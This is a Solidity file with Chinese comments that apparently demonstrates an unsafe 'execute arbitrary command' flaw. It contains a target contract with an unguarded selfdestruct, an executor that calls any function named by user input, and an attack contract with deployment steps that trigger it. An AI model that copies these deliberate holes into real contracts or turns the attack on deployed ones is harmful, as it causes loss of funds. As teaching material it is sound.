// SPDX-License-Identifier: MIT
// 漏洞示範：Unsafe External Command Execution
// 此實作允許外部提交任意指令字串，然後利用低層 call 執行目標合約的函數，可能造成預料外的行為。
// 注意：本漏洞與 Solidity 版本無關，請注意在不同網路上執行外部指令可能導致非一致性結果。

pragma solidity >=0.8.0;

// 目標合約，擁有一個危險函數 pwn()，被設計用來在指令執行中被觸發
contract VulnerableTarget {
    // 此函數在被呼叫時將 selfdestruct，將合約餘額轉移給呼叫者
    // 漏洞標示：該函數未做任何存取控制，被任何人藉由外部命令呼叫
    function pwn() external {
        selfdestruct(payable(msg.sender));
    }
}

// 不安全的外部指令執行合約
contract UnsafeCommandExecutor {
    // 漏洞狀態變數：記錄最後執行命令，但未驗證命令來源是否可信
    string public lastExecutedCommand; // vulnerable state variable

    // 此函數允許任何人請求對任意合約(target)執行任意函數(command)
    // 漏洞重點：命令字串未經過嚴格檢查，直接以低層 call 呼叫外部合約
    function executeCommand(address target, string calldata command) external payable returns (bytes memory) {
        // 記錄下執行指令，沒有必須保證指令安全性
        lastExecutedCommand = command; // vulnerable assignment

        // 構造函數呼叫的資料，這裡會將傳入的命令字串與 '()' 串接後，直接使用 call
        // 攻擊者可以傳入任意有效的函數名稱，如 'pwn'，進而觸發目標合約中的危險行為
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature(string(abi.encodePacked(command, "()"))));
        require(success, "Command execution failed");
        return data;
    }
}

// 攻擊合約，用來展示如何利用 UnsafeCommandExecutor 執行外部指令
contract Attack {
    UnsafeCommandExecutor public executor;
    VulnerableTarget public target;

    // 在部署 Attack 合約前，必須先部署 UnsafeCommandExecutor 與 VulnerableTarget
    // 並將其地址傳入 Attack 之建構子
    constructor(address _executor, address _target) {
        executor = UnsafeCommandExecutor(_executor);
        target = VulnerableTarget(_target);
    }

    // 攻擊步驟：呼叫 executeCommand 並傳入命令字串 'pwn'
    // 這會觸發 VulnerableTarget 合約中的 pwn() 函數，導致合約 selfdestruct，損失資金
    function attack() external {
        // 攻擊者藉由傳入 'pwn' 作為指令觸發目標合約的 selfdestruct
        executor.executeCommand(address(target), "pwn");
    }
}

/*
部署與攻擊步驟：
1. 部署 VulnerableTarget 合約。
2. 部署 UnsafeCommandExecutor 合約。
3. 部署 Attack 合約，建構子中傳入 UnsafeCommandExecutor 與 VulnerableTarget 的地址。
4. 呼叫 Attack 合約的 attack() 函數，即可觸發 VulnerableTarget 合約的 selfdestruct 行為。
這個範例展示了如何利用不安全的外部命令執行來造成重大損失。
*/
